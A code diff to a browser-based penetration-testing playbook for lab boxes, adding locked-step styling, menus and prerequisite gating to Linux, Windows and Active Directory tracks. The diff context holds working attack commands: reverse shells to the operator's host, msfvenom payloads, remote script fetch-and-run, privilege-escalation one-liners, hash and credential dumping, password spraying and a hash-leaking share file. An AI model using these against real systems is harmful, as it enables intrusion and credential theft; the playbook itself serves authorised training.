@@ -408,6 +408,87 @@ body.overlay-open{overflow:hidden}
 .empty-cta h3{margin:0 0 5px;font-family:var(--mono);font-size:14px;color:var(--ink)}
 .empty-cta p{margin:0 0 11px;color:var(--muted);font-size:12.5px;max-width:70ch}
 
+/* ---------- locked steps and phases ---------- */
+/* A step whose prerequisite is not met is not hidden -- seeing what comes next
+   is half the value of a playbook -- but it is not tickable either, and it says
+   what it is waiting for. Fully-gated phases collapse to a single line. */
+.step.locked{opacity:.55}
+.step.locked .cb input{cursor:not-allowed}
+.step.locked .step-desc{cursor:default}
+.lockgroup{margin:8px 0 2px;border:1px dashed var(--line);border-radius:8px;background:rgba(0,0,0,.14)}
+.lockgroup>summary{list-style:none;cursor:pointer;padding:8px 11px;font-family:var(--mono);
+  font-size:11.5px;color:var(--faint);user-select:none;display:flex;gap:7px;align-items:center}
+.lockgroup>summary::-webkit-details-marker{display:none}
+.lockgroup>summary::before{content:"\1F512";font-size:10px;opacity:.75}
+.lockgroup>summary:hover{color:var(--muted)}
+.lockgroup[open]>summary{border-bottom:1px solid var(--line)}
+.lockgroup .step{padding-left:11px;padding-right:11px}
+.phase.locked>summary{opacity:.62}
+.phase.locked .num{background:var(--line);color:var(--faint)}
+.gate{margin:2px 0 8px;padding:8px 11px;border-left:2px solid var(--line);
+  font-size:12.5px;color:var(--muted)}
+.gate b{color:var(--ink);font-family:var(--mono);font-size:12px}
+.lockbadge{font-family:var(--mono);font-size:10.5px;color:var(--faint);
+  border:1px solid var(--line);border-radius:4px;padding:1.5px 7px;white-space:nowrap}
+
+/* ---------- ranked pills ---------- */
+.pillrow .track-pill.demoted{display:none}
+.pillrow.show-all .track-pill.demoted{display:flex}
+.morepill{flex:none;font-family:var(--mono);font-size:11.5px;color:var(--faint);background:transparent;
+  border:1px dashed var(--line);border-radius:999px;padding:5px 12px;cursor:pointer;white-space:nowrap}
+.morepill:hover{color:var(--ink);border-color:var(--faint)}
+.track-pill .why{font-size:10.5px;color:inherit;opacity:.6;font-weight:400;margin-left:7px;
+  padding-left:7px;border-left:1px solid currentColor}
+@media (max-width:820px){.track-pill .why{display:none}}
+.track-pill.active .why{opacity:.8}
+
+/* ---------- next moves ---------- */
+.moves{display:flex;flex-direction:column;gap:8px}
+.move{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;background:var(--surface);border:1px solid var(--line);
+  border-left:3px solid var(--mc,var(--accent));border-radius:9px;padding:11px 14px;cursor:pointer;
+  text-align:left;width:100%;font:inherit;color:inherit;transition:border-color .12s}
+.move:hover{border-color:var(--faint)}
+.move .mt{font-family:var(--mono);font-size:13px;color:var(--ink);flex:none}
+.move .mw{font-size:12.5px;color:var(--muted);flex:1 1 260px;min-width:0}
+.move .mg{font-family:var(--mono);font-size:10.5px;color:var(--mc,var(--accent));flex:none}
+
+/* ---------- scan intake (front door) ---------- */
+.intake{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:18px 20px;margin:4px 0 16px}
+.intake h3{margin:0 0 5px;font-family:var(--mono);font-size:15px;color:var(--ink)}
+.intake p.lede{margin:0 0 13px;color:var(--muted);font-size:13px;max-width:72ch}
+.intake .planner textarea{min-height:120px}
+.boxtype{display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap;
+  background:var(--elev);border:1px solid var(--line);border-left:3px solid var(--c,var(--accent));
+  border-radius:10px;padding:13px 16px;margin:2px 0 6px}
+.boxtype .bt{font-family:var(--mono);font-size:15px;color:var(--ink)}
+.boxtype .bw{font-size:12.5px;color:var(--muted);margin-top:2px}
+
+/* ---------- header menus ---------- */
+.menu{position:relative;display:inline-block}
+.menu>summary{list-style:none;cursor:pointer;font-family:var(--mono);font-size:11.5px;color:var(--muted);
+  user-select:none;padding:2px 0}
+.menu>summary::-webkit-details-marker{display:none}
+.menu>summary:hover{color:var(--ink)}
+.menu-body{position:absolute;z-index:50;top:calc(100% + 6px);left:0;min-width:168px;background:var(--elev);
+  border:1px solid var(--line);border-radius:9px;padding:6px;box-shadow:0 14px 34px rgba(0,0,0,.5);
+  display:flex;flex-direction:column;gap:1px}
+.menu-body.right{left:auto;right:0}
+.menu-body button{text-align:left;font-family:var(--mono);font-size:12px;color:var(--muted);
+  background:none;border:0;border-radius:6px;padding:6px 9px;cursor:pointer;white-space:nowrap}
+.menu-body button:hover{color:var(--ink);background:var(--surface)}
+.menu-body button.danger:hover{color:#fb7185}
+.menu-body hr{border:0;border-top:1px solid var(--line);margin:4px 2px}
+/* The folded fields take a full row of their own, so revealing them must not
+   squeeze BOX and IP to nothing: the row wraps, and the two primary fields
+   keep a fixed basis rather than splitting whatever is left. */
+.vars{flex-wrap:wrap;justify-content:flex-start}
+.vars>.field{flex:0 1 300px}
+.vars-more{display:none;gap:7px;flex:1 1 100%;min-width:0}
+.vars.open .vars-more{display:flex}
+.varsmore-btn{flex:none;font-family:var(--mono);font-size:11px;color:var(--faint);background:transparent;
+  border:1px dashed var(--line);border-radius:7px;padding:4px 10px;cursor:pointer;white-space:nowrap}
+.varsmore-btn:hover{color:var(--ink);border-color:var(--faint)}
+
 /* ---------- responsive ---------- */
 @media (max-width:1040px){.vars{flex-wrap:wrap}.vars .field{flex:1 1 150px}}
 @media (max-width:680px){.stuck-body{columns:1}.vars .field{flex:1 1 130px}
@@ -460,22 +541,34 @@ body.overlay-open{overflow:hidden}
     <div class="boxbar">
       <label class="pill-label" for="boxPick" style="width:auto;padding:0">box</label>
       <select id="boxPick" title="Switch between saved boxes"></select>
-      <button class="txtbtn" id="boxNew" type="button">new</button>
-      <button class="txtbtn" id="boxDup" type="button">duplicate</button>
-      <button class="txtbtn" id="boxDel" type="button">delete</button>
-      <span class="bsep"></span>
-      <button class="txtbtn" id="boxExport" type="button">export box</button>
-      <button class="txtbtn" id="boxImport" type="button">import</button>
+      <details class="menu" id="boxMenu">
+        <summary title="New, duplicate, delete, export or import a box">manage &#9662;</summary>
+        <div class="menu-body">
+          <button class="txtbtn" id="boxNew" type="button">new box</button>
+          <button class="txtbtn" id="boxDup" type="button">duplicate this box</button>
+          <hr>
+          <button class="txtbtn" id="boxExport" type="button">export box&hellip;</button>
+          <button class="txtbtn" id="boxImport" type="button">import box&hellip;</button>
+          <hr>
+          <button class="txtbtn danger" id="boxDel" type="button">delete this box</button>
+        </div>
+      </details>
       <input type="file" id="boxFile" accept="application/json,.json" hidden>
     </div>
+    <!-- BOX and IP are always needed. The rest only matter once you are firing
+         a shell, working a domain or holding a credential, so they stay folded
+         until the derived context says otherwise. -->
     <div class="vars" id="vars">
       <div class="field"><label>box</label><input id="v_BOX" placeholder="name" autocomplete="off"></div>
       <div class="field ip"><label>IP</label><input id="v_IP" placeholder="10.10.10.10" autocomplete="off"></div>
-      <div class="field lhost"><label>LHOST</label><input id="v_LHOST" placeholder="your tun0 IP" autocomplete="off"></div>
-      <div class="field short"><label>LPORT</label><input id="v_LPORT" placeholder="443" autocomplete="off"></div>
-      <div class="field"><label>DOMAIN</label><input id="v_DOMAIN" placeholder="box.local" autocomplete="off"></div>
-      <div class="field"><label>USER</label><input id="v_USER" placeholder="user" autocomplete="off"></div>
-      <div class="field"><label>PASS</label><input id="v_PASS" placeholder="pass" autocomplete="off"></div>
+      <button class="varsmore-btn" id="varsMore" type="button" aria-expanded="false" aria-controls="varsMoreRow">more &#9662;</button>
+      <div class="vars-more" id="varsMoreRow">
+        <div class="field lhost"><label>LHOST</label><input id="v_LHOST" placeholder="your tun0 IP" autocomplete="off"></div>
+        <div class="field short"><label>LPORT</label><input id="v_LPORT" placeholder="443" autocomplete="off"></div>
+        <div class="field"><label>DOMAIN</label><input id="v_DOMAIN" placeholder="box.local" autocomplete="off"></div>
+        <div class="field"><label>USER</label><input id="v_USER" placeholder="from the creds table" autocomplete="off"></div>
+        <div class="field"><label>PASS</label><input id="v_PASS" placeholder="from the creds table" autocomplete="off"></div>
+      </div>
     </div>
     <div class="pill-group"><span class="pill-label">tools</span><div class="pillrow" id="tools"></div></div>
     <div class="pill-group"><span class="pill-label">tracks</span><div class="pillrow" id="tracks"></div></div>
@@ -487,9 +580,15 @@ body.overlay-open{overflow:hidden}
         <span class="timer"><span id="timerVal" title="Time on this box">--:--:--</span><button class="txtbtn" id="timerStart" type="button">start</button><button class="txtbtn" id="timerReset" type="button">reset</button></span>
       </div>
       <div class="actions">
-        <button class="txtbtn" id="expandAll">expand</button>
-        <button class="txtbtn" id="collapseAll">collapse</button>
-        <button class="txtbtn" id="resetProg">reset ticks</button>
+        <details class="menu" id="viewMenu">
+          <summary title="View controls">&#8943;</summary>
+          <div class="menu-body right">
+            <button class="txtbtn" id="expandAll" type="button">expand all phases</button>
+            <button class="txtbtn" id="collapseAll" type="button">collapse all phases</button>
+            <hr>
+            <button class="txtbtn danger" id="resetProg" type="button">reset ticks&hellip;</button>
+          </div>
+        </details>
         <button class="txtbtn accent" id="exportReport">export report</button>
       </div>
     </div>
@@ -695,7 +794,7 @@ const TRACKS=[
 {id:"linux",name:"Linux",colour:COL.linux,
  blurb:"Standalone Linux host: from a foothold shell to root.",
  phases:[
- {n:1,title:"Get and stabilise a shell",tag:"connect",goal:"A stable interactive shell",steps:[
+ {n:1,title:"Get and stabilise a shell",tag:"connect",goal:"A stable interactive shell",gives:"shell",steps:[
    {d:"Start your listener",c:"rlwrap nc -lvnp {LPORT}",l:"Running before you fire the payload."},
    {d:"Reverse shell (grab the right one from revshells.com)",c:"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
     l:"If bash is filtered, use the python, nc-mkfifo or perl variant."},
@@ -708,7 +807,7 @@ const TRACKS=[
    {d:"Landed in a restricted shell (rbash/rksh)? break out",c:"ssh {USER}@{IP} -t bash --noprofile --norc   # ask for bash at login\n# already in: vi -> :set shell=/bin/sh :shell   |   or  python3 -c 'import os;os.system(\"/bin/bash\")'\n# PATH/builtins limited: export PATH=/bin:/usr/bin; /bin/bash",
     l:"A restricted shell blocks cd, /, and PATH changes. Request <code>bash</code> at SSH login, or break out through any program that spawns a shell (vi, less, awk, find, man \u2014 GTFOBins lists them)."}
  ],tips:["Host files with <code>python3 -m http.server 80</code>, pull with wget or curl.","Keep the listener in its own tmux pane.","<b>Shell won't upgrade?</b> If <code>pty.spawn</code> does nothing and Ctrl-Z hangs, you are on a <i>command-runner</i> payload (e.g. <code>msfvenom php/reverse_php</code>), not a real interactive shell \u2014 there is no shell process to attach a PTY to. Use pentestmonkey's <code>php-reverse-shell.php</code> (it spawns <code>/bin/sh -i</code>), or from the dead shell fire a fresh bash/python reverse shell to a second listener and upgrade <i>that</i>."]},
- {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
+ {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Check sudo rights first, the fastest win",c:"sudo -l",l:"Anything listed almost certainly has an exact escalation on <b>GTFOBins</b>."},
    {d:"Get linpeas onto the box, then actually read it",c:"# on YOUR box, in the folder holding linpeas.sh:\npython3 -m http.server 4444\n# on the TARGET:\nwget http://{LHOST}:4444/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt\n# no wget? curl -s http://{LHOST}:4444/linpeas.sh | sh\n# nothing writable but /dev/shm? cd /dev/shm first",l:"Serve and fetch on the <b>same</b> port — that is the mistake people make here. 4444 is fine for the transfer, but it is also the default listener port, so if you are catching a shell on it serve on 80 or 8000 instead. Pipe it straight to <code>sh</code> when you cannot write to disk, at the cost of not keeping the output. Then read it: the red and yellow highlights are the whole point, and scrolling past them is how a box takes an extra hour."},
    {d:"Watch for cron jobs and hidden processes without root",c:"./pspy64 -pf -i 1000   # wget it from your box first",l:"<b>pspy</b> shows every process and cron as it fires, including root ones you cannot see in <code>ps</code>. The fastest way to spot a root cron running a writable script \u2014 the SolidState/Nibbles pattern."},
@@ -717,7 +816,7 @@ const TRACKS=[
    {d:"Hunt for creds in configs, history and web roots",c:"cat ~/.bash_history; grep -riE 'password|passwd|secret' /var/www /etc 2>/dev/null",l:"Reused passwords escalate more boxes than any exploit."},
    {d:"Check whether this shell is inside a container",c:"ls -la /.dockerenv /run/.containerenv 2>/dev/null; grep -qiE 'docker|lxc|kubepods' /proc/1/cgroup && echo CONTAINED",l:"If either fires, the path to root is a break-out, not ordinary privesc — switch to the <b>Container escape</b> track."}
  ],branch:["<code>/.dockerenv</code>, <code>/run/.containerenv</code> or docker/lxc/kubepods in /proc/1/cgroup → Container escape track"]},
- {n:3,title:"Escalate to root",tag:"privesc",goal:"user \u2192 root",steps:[
+ {n:3,title:"Escalate to root",tag:"privesc",goal:"user \u2192 root",when:c=>c.shell!=="none",needs:"a shell on the box",gives:"root",steps:[
    {d:"Abuse sudo / SUID via GTFOBins — and pass -p when the bit is SUID",c:"sudo /usr/bin/find . -exec /bin/sh \\; -quit            # sudo rule\n/opt/fileS . -exec /bin/sh -p \\; -quit                 # SUID copy of find\n/usr/bin/php7.4 -r \"pcntl_exec('/bin/sh', ['-p']);\"    # SUID interpreter\ngdb -nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")' -ex quit",l:"GTFOBins gives the exact line per binary, but its <b>SUID</b> section differs from its <b>Sudo</b> section in one detail that quietly costs you the root: <code>bash</code> and <code>sh</code> drop the effective uid on startup unless you pass <code>-p</code>. Without it the shell returns as your own user and the binary reads as unexploitable. A SUID <i>interpreter</i> — php, gdb, python, perl, ruby — is the same win in a different wrapper: have it exec a shell with the privilege preserved. The <i>MZEEAV</i> (find), <i>Astronaut</i> (php) and <i>Gaara</i> (gdb) roots."},
    {d:"Capabilities are a second SUID list — cap_setuid is a root shell",c:"getcap -r / 2>/dev/null\n# cap_setuid=ep on an interpreter — set uid 0 yourself, no SUID bit in sight:\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\nperl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",l:"<code>find -perm -4000</code> never shows these: a capability lives in an xattr, not the mode bits, so a box with a clean SUID list can still hand you root here. <code>cap_setuid</code> is the outright win; <code>cap_dac_read_search</code> reads any file, <code>cap_dac_override</code> writes any file, and <code>cap_sys_ptrace</code> lets you inject into a root process. The <i>Levram</i> root is <code>cap_setuid</code> on python3.10."},
    {d:"Writable /etc/passwd or PATH hijack on a root process",c:"openssl passwd -1 -salt x pass   # add a uid-0 line if /etc/passwd is writable",l:"Common on soft boxes. PATH hijack works when a root script calls a binary by name. The same trick applies to <b>imports</b>: if a script root runs does <code>import config</code> and its directory (or any earlier <code>sys.path</code> entry) is writable, drop your own <code>config.py</code> and it executes as root."},
@@ -730,7 +829,7 @@ const TRACKS=[
    {d:"A unix socket you can write is a shell as whoever is listening",c:"ls -la /tmp /run /var/run /opt/*/  | grep '^s'      # srwx... is a socket\nsocat - UNIX-CONNECT:/opt/app/sockets/live.sock\n# HTTP over a socket (docker, podman, many agents):\ncurl --unix-socket /var/run/docker.sock http://localhost/version",l:"A socket file carries ordinary file permissions, and a service that creates one world-writable hands its privileges to anyone who connects. If the process on the other end is a shell server you land as that user; if it is an API you get whatever the API does — <code>docker.sock</code> being the famous case, and that one is a root-equivalent escape covered in the Container track. Check <code>/run</code> and any application directory, not just <code>/tmp</code>. The <i>BankSmarter</i> lateral move."},
    {d:"Kernel exploit as a last resort",c:"# uname -a  then searchsploit the kernel; understand it before running",l:"Kernel exploits can crash the box. Exhaust misconfigs first."}
  ],branch:["Rooted \u2192 loot phase","Second NIC or internal hosts \u2192 Pivoting track"]},
- {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and gather for reuse",steps:[
+ {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and gather for reuse",when:c=>c.shell!=="none",needs:"a shell on the box",gives:"root",steps:[
    {d:"Grab proof with context",c:"cat /root/root.txt; id; ip a",l:"Screenshot the flag next to whoami and ip in the same frame."},
    {d:"Dump and crack shadow, collect keys",c:"cat /etc/shadow; cat /etc/passwd   # unshadow then hashcat -m 1800",l:"SSH keys under ~/.ssh and creds in configs feed lateral movement."},
    {d:"Domain-joined Linux box? it is holding Kerberos credentials",c:"ls -la /etc/krb5.keytab /etc/krb5.conf /var/lib/sss/db/ /tmp/krb5cc_*\npython3 keytabextract.py /etc/krb5.keytab     # NTLM and AES keys, no cracking\n# a ccache is usable as-is:\nexport KRB5CCNAME=/tmp/krb5cc_0 && impacket-psexec -k -no-pass {DOMAIN}/{USER}@<host>",l:"Linux hosts join domains too, and when they do they keep a <b>keytab</b> — long-term Kerberos keys for a real domain account, readable by root and often by more than that. <b>KeyTabExtract</b> pulls the NTLM and AES keys straight out, so rooting one Linux box can hand you a domain foothold with nothing to crack. A <code>krb5cc_*</code> ccache in /tmp is even better: it is a live ticket you can export and use immediately. Always check for these before writing a Linux box off as a dead end. The <i>Anomaly</i> pivot into the domain."}
@@ -741,7 +840,7 @@ const TRACKS=[
 {id:"windows",name:"Windows",colour:COL.windows,
  blurb:"Standalone Windows host (not domain-joined): from foothold to SYSTEM.",
  phases:[
- {n:1,title:"Get a shell",tag:"connect",goal:"A working shell on the host, including routes that survive Defender",steps:[
+ {n:1,title:"Get a shell",tag:"connect",goal:"A working shell on the host, including routes that survive Defender",gives:"shell",steps:[
    {d:"If WinRM (5985) is open and you have creds, use it",c:"evil-winrm -i {IP} -u {USER} -p {PASS}",l:"The cleanest Windows shell. Pass a hash with -H instead of -p."},
    {d:"Otherwise catch a reverse shell from an exploit or upload",c:"rlwrap nc -lvnp {LPORT}   # payload from revshells.com (powershell #3 is reliable)",l:"For a binary foothold, build one below and host it."},
    {d:"Build and host a reverse-shell exe if you need one",c:"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o rev.exe",
@@ -758,21 +857,21 @@ const TRACKS=[
     l:"A generic nc/ncat session carries no Metasploit signature, though nc.exe itself is sometimes flagged. A scripting-language one-liner (python/powershell) is often cleaner than msfvenom output."}
  ],tips:["When Defender eats a payload it is almost always the <b>on-disk signature</b> of a framework stager. Credentialed remoting and in-memory execution sidestep the disk entirely, and most OSCP-style Windows boxes never need a smuggled binary at all.",
    "Actually defeating Defender (obfuscation, AMSI/ETW patching, custom loaders) is a build-your-own skill for authorised work \u2014 the OSCP AV-evasion module and Sektor7's course are the standard places to learn it."]},
- {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
+ {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Check your privileges first",c:"whoami /priv",l:"<b>SeImpersonate or SeAssignPrimaryToken \u2192 a Potato attack to SYSTEM.</b> Note it immediately."},
    {d:"Get winpeas onto the box and run it",c:"# on YOUR box:  python3 -m http.server 4444\ncertutil.exe -urlcache -f http://{LHOST}:4444/winPEASx64.exe C:\\Windows\\Temp\\wp.exe\n# or, no file on disk:\niwr -Uri http://{LHOST}:4444/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe > C:\\Windows\\Temp\\wp.txt",l:"Reads services, creds and misconfigs. Mind the highlights. Defender eats winPEAS on sight, so expect to need the AV-evasion track, or fall back to the manual checks below — <code>whoami /priv</code>, <code>systeminfo</code> and <code>accesschk</code> cover most of what it would have told you."},
    {d:"System info, services and stored creds",c:"systeminfo; cmdkey /list",l:"Unquoted service paths, weak service perms (accesschk), unattend.xml, registry autologon, saved creds. App password stores too: <b>mRemoteNG</b> (confCons.xml \u2014 decrypt with mremoteng_decrypt), <b>TeamViewer</b> and PuTTY sessions in the registry, and a <b>.vhd/.vhdx</b> on a share (mount it, then <code>reg save</code> the SAM/SYSTEM)."},
    {d:"Re-use a saved credential without knowing it",c:"runas /user:{DOMAIN}\\administrator /savecred \"cmd /c whoami\"",l:"If <code>cmdkey /list</code> shows a stored credential, <code>/savecred</code> runs as that user blind. The Access root."},
    {d:"Hunt Alternate Data Streams (files hiding in NTFS)",c:"dir /R    # PowerShell: Get-Item -Path * -Stream *; then  Get-Content file -Stream <name>",l:"A 0-byte file can carry a password in an ADS. <code>smbclient</code> shows them with <code>allinfo</code>. The Nest trick."}
  ]},
- {n:3,title:"Escalate to SYSTEM",tag:"privesc",goal:"user \u2192 SYSTEM",steps:[
+ {n:3,title:"Escalate to SYSTEM",tag:"privesc",goal:"user \u2192 SYSTEM",when:c=>c.shell!=="none",needs:"a shell on the box",gives:"root",steps:[
    {d:"Token privilege \u2192 Potato",c:"# PrintSpoofer.exe -i -c cmd   (or GodPotato / JuicyPotatoNG depending on OS)",l:"The go-to when SeImpersonate is present. Pick the potato for the Windows build."},
    {d:"Service misconfig abuse",c:"# weak service perms: sc config <svc> binpath= \"C:\\path\\rev.exe\" ; sc start <svc>",l:"Unquoted paths and writable service binaries are classic wins. So is <b>group</b> membership: <i>Server Operators</i> may reconfigure any service, so <code>sc config VSS binpath= \"...\" &amp;&amp; sc start VSS</code> runs your command as SYSTEM without touching a file. <code>accesschk.exe -uwcqv {USER} *</code> lists what you may change."},
    {d:"Backup Operators: read the hives you are not allowed to read",c:"# SeBackupPrivilege ignores the DACL, and the group has it on every host it covers\nimpacket-reg {DOMAIN}/{USER}:{PASS}@{IP} backup -o '\\\\{LHOST}\\share'\nimpacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n# on the box instead:  reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv",l:"<b>Backup Operators</b> is a default group people treat as harmless, and it carries <b>SeBackupPrivilege</b> and <b>SeRestorePrivilege</b> — the right to read any file regardless of its ACL. On a workstation that is the local Administrator hash; on a <b>domain controller</b> it is the machine account hash, which can DCSync, so the group is domain compromise wearing a helpdesk badge. Distinct from <i>Server Operators</i> above (which reconfigures services) and it works remotely, without the local diskshadow dance. The <i>NorthBridge</i> and <i>Odyssey</i> escalations."},
    {d:"AlwaysInstallElevated and other quick checks",c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",l:"If both HKLM and HKCU are 1, an msi runs as SYSTEM."},
    {d:"Got another user\u2019s password but no WinRM or RDP? run as them anyway",c:"RunasCs.exe <user> <pass> \"cmd /c whoami\" -r {LHOST}:{LPORT}",l:"A plain <code>runas</code> needs an interactive desktop; <b>RunasCs</b> does not, so it works from a reverse shell. Use it whenever cracking or looting hands you a local account the box will not let you log in with remotely. <code>runas /savecred</code> covers the case where the cred is already stored. The <i>Flight</i> and <i>Acute</i> pivots."}
  ],branch:["SYSTEM \u2192 loot phase","Domain-joined after all (creds/domain seen) \u2192 Active Directory track"]},
- {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and dump creds",steps:[
+ {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and dump creds",when:c=>c.shell!=="none",needs:"a shell on the box",gives:"root",steps:[
    {d:"Grab proof with context",c:"type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & ipconfig",l:"Flag plus whoami and ipconfig in one screenshot."},
    {d:"Dump local hashes",c:"impacket-secretsdump -sam sam.hive -system system.hive LOCAL",l:"Or secretsdump remotely with admin creds. Reuse local admin hash across other hosts."},
    {d:"DPAPI \u2014 decrypt the creds Windows saved for the user",c:"# blobs:  %APPDATA%\\Microsoft\\Credentials\\  and  ..\\Protect\\<SID>\\ (masterkey)\nmimikatz # dpapi::masterkey /in:<masterkey> /sid:<SID> /password:<user-pw>\nmimikatz # dpapi::cred /in:<blob>      # or: impacket-dpapi credential -file <blob> -key <mk>",l:"Saved RDP and network passwords, browser logins and scheduled-task creds are DPAPI blobs, not hashes \u2014 they decrypt to <b>plaintext</b> given the user\u2019s password, their NT hash, or SYSTEM on the box. Often the only way to turn one cracked account into another\u2019s cleartext. The <i>Access</i> path."},
@@ -786,19 +885,19 @@ const TRACKS=[
  blurb:"The AD kill chain: from no credentials to Domain Admin. Reference: The Hacker Recipes.",
  phases:[
  {n:1,title:"No creds (external foothold)",tag:"recon \u2192 attack",goal:"Get your first username or password",steps:[
-   {d:"Read LAPS and gMSA passwords (if your user may)",c:"nxc ldap {IP} -u {USER} -p {PASS} --laps; nxc ldap {IP} -u {USER} -p {PASS} --gmsa",l:"LAPS stores the local-admin password on the computer object (ms-Mcs-AdmPwd); gMSA accounts hand out their own password to those allowed to read it (gMSADumper.py). BloodHound flags who can read each. The Timelapse / Support paths."},
+   {when:c=>c.creds>0,needs:"a domain credential",d:"Read LAPS and gMSA passwords (if your user may)",c:"nxc ldap {IP} -u {USER} -p {PASS} --laps; nxc ldap {IP} -u {USER} -p {PASS} --gmsa",l:"LAPS stores the local-admin password on the computer object (ms-Mcs-AdmPwd); gMSA accounts hand out their own password to those allowed to read it (gMSADumper.py). BloodHound flags who can read each. The Timelapse / Support paths."},
    {d:"Recover a deleted account from the AD Recycle Bin",c:"Get-ADObject -SearchBase \"CN=Deleted Objects,$(([ADSI]'').distinguishedName)\" -IncludeDeletedObjects -Filter * -Properties * | select samAccountName,lastKnownParent",l:"Deleted objects keep their attributes \u2014 a decommissioned admin\u2019s password often still works. The Cascade root."},
    {d:"Enumerate valid users",c:"kerbrute userenum -d {DOMAIN} --dc {IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
     l:"Also pull users from anonymous LDAP or SMB where allowed."},
    {d:"Null or guest session? brute the RIDs for a user list",c:"nxc smb {IP} -u '' -p '' --rid-brute 10000    # or: impacket-lookupsid {DOMAIN}/guest@{IP} 10000",l:"Walks SIDs from 500 upward and resolves each to a name, so it returns the <b>real</b> domain users and groups rather than guesses from a wordlist. Feed the result straight into AS-REP roasting and spraying. Works on many DCs that otherwise look locked down. The <i>Flight</i> and <i>Forest</i> user lists."},
-   {d:"Read the user objects, not just their names — description holds passwords",c:"nxc ldap {IP} -u {USER} -p {PASS} -M user-desc\nldapsearch -x -H ldap://{IP} -b \"DC=example,DC=com\" \"(objectClass=user)\" sAMAccountName description info | grep -iE 'sAMAccountName|description|info'",l:"<code>description</code> and <code>info</code> are free-text and visible to <b>any</b> authenticated user — often to an anonymous bind too. Helpdesk staff park a reset password there and never clear it, so this pays out before any roasting or spraying. Works with the null/guest session above where the DC allows it. Both <i>Hokkaido</i> and <i>Nagoya</i> hand out a first credential this way."},
+   {when:c=>c.creds>0||c.hasSMB,needs:"a credential or a null/guest session",d:"Read the user objects, not just their names — description holds passwords",c:"nxc ldap {IP} -u {USER} -p {PASS} -M user-desc\nldapsearch -x -H ldap://{IP} -b \"DC=example,DC=com\" \"(objectClass=user)\" sAMAccountName description info | grep -iE 'sAMAccountName|description|info'",l:"<code>description</code> and <code>info</code> are free-text and visible to <b>any</b> authenticated user — often to an anonymous bind too. Helpdesk staff park a reset password there and never clear it, so this pays out before any roasting or spraying. Works with the null/guest session above where the DC allows it. Both <i>Hokkaido</i> and <i>Nagoya</i> hand out a first credential this way."},
    {d:"AS-REP roast users without pre-auth",c:"impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile users.txt -dc-ip {IP}",l:"Crack any $krb5asrep$ hash offline with hashcat -m 18200."},
    {d:"Poison and relay on the local segment",c:"sudo responder -I tun0    # then relay/crack captured NetNTLM",l:"mitm6 for IPv6 DNS takeover. Great when you are on the internal network."},
    {d:"Writable share? plant a forced-auth file and catch a browsing user’s hash",c:"cat > @pwn.scf <<'EOF'\n[Shell]\nCommand=2\nIconFile=\\\\{LHOST}\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\nEOF\nsmbclient //{IP}/<share> -N -c 'put @pwn.scf'   # Responder already listening",l:"Explorer fetches that icon over SMB the moment anyone opens the folder, leaking their NetNTLMv2 to your Responder — no click needed, and the leading <code>@</code> sorts the file to the top. Crack it (hashcat -m 5600) or relay it. A <code>.url</code> file (<code>[InternetShortcut]</code> / <code>URL=file://{LHOST}/x.ico</code>) or a <code>.lnk</code> with a UNC icon does the same and still fires where .scf has been patched out. The <i>Sizzle</i> foothold."},
    {d:"An appliance that does an LDAP bind? point it at yourself (LDAP passback)",c:"sudo nc -lvnp 389    # then set the device’s LDAP server to {LHOST} and press 'test'",l:"Printer and appliance admin panels store a service account for directory lookups and will re-authenticate to whatever server you name — the bind lands on your listener in <b>cleartext</b>. If the client insists on a real handshake before sending the password, run a throwaway <code>slapd</code> instead of nc. The <i>Return</i> foothold."},
    {d:"Spray a weak password across the users",c:"nxc smb {IP} -u users.txt -p 'Welcome1' --continue-on-success",l:"Watch the lockout policy first (nxc --pass-pol). One password, many users."}
  ]},
- {n:2,title:"First creds",tag:"recon",goal:"Turn one credential into a map of the domain",steps:[
+ {n:2,title:"First creds",tag:"recon",goal:"Turn one credential into a map of the domain",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Validate and see where the cred works",c:"nxc smb {IP} -u {USER} -p {PASS}    # (Pwn3d! means local admin there)",l:"Run it across the whole range to find where this account is admin."},
    {d:"Collect BloodHound data",c:"bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"Do this early. It draws the shortest path to Domain Admin for you."},
